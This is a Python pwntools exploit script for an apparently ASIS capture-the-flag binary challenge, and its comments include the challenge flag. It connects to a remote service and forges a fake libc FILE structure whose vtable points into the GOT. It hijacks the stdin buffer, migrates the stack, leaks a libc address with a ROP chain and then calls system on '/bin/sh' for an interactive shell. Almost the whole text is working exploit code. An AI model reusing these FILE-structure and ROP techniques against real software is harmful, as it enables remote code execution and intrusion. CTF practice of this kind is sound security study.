#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

#host = "10.211.55.6"
#port = 8888
#ASIS{D1d_U_M133_M3_D1d_U_M133_M3?}
host = "178.62.249.106"
port = 54518

context.arch = "amd64"
r = remote(host,port)
r.recvuntil("?")
r.sendline(str(0x5d5908)) # prepare overwrite _IO_buf_base in stdin
r.recvuntil("?")
r.sendline(str(0x210000))
r.recvuntil("?")
read_got = 0x600fc0
fp = 0x600fc8  # Let _chain = g_buf_ptr
lock = 0x601700
write_base = 0x601200 
write_ptr = 0x601210
write_end = 0x601200
buf_base = 0x601c00
buf_end =  0x601f00
vtable = 0x0000000000600fd8 # point to GOT
mode = 0xffffffff
fake_fp = "%13$s%9$s".ljust(0x20,"\x00") + p64(write_base) + p64(write_ptr) + p64(write_end) + p64(0)*10+ p64(lock) + p64(0)*6 + p32(mode) + p32(0) + p64(0)*2 + p64(vtable)
# %13$s read until no data in buffer
# %9$s read the rop payload to stack
# Be triggered in _IO_flush_lockp
r.sendline(fake_fp)

payload = p64(write_base) + p64(write_ptr) + p64(write_end) + p64(buf_base) + p64(buf_end) + p64(0)*4 + p64(fp) + p64(0)
# Let _chain in stdin point to the fp
r.sendline(payload)

# Now the linked list of FILE :
# stderr -> stdout -> stdin -> fp -> fake_fp
# the virtual function call will be triggered in fake_fp
# You will get a stack overflow and rop

pop_rbp = 0x0000000000400685
pop_rdi = 0x0000000000400923
pop_rsi_r15 = 0x0000000000400921
mov_deax_leave = 0x0000000000400774
leave = 0x0000000000400777
mov_eax_leave = 0x0000000000400862
mov_eax_pop_rbp = 0x00000000004008b3
printf = 0x400600
read_n = 0x000000000040072a
pop_rbx = 0x40091a
pop_rsp_r13_r14_r15 = 0x000000000040091d
set_rsi_large_pop_rbp = 0x4006ba

# But the rop is can not have 0x9,0xb,0x20....
# So we need to read again
set_migration_payload = p64(0) + p64(set_rsi_large_pop_rbp) + p64(buf_base) +p64(read_n)
r.sendline(set_migration_payload)
time.sleep(0.5)

# ROP to get shell
rop = flat([pop_rdi,read_got,printf,pop_rdi,buf_base,pop_rsi_r15,buf_base,0,read_n,pop_rbp,buf_base,leave])
r.sendline("a"*0x500 + rop)
libc = u64(r.recvuntil("\x7f")[1:].ljust(8,"\x00")) - 0xf7220
print "libc:",hex(libc)
system = libc + 0x45390
sh = libc + 0x18cd17
rop2 = flat([buf_base,pop_rdi,sh,system])
r.sendline(rop2)
r.interactive()
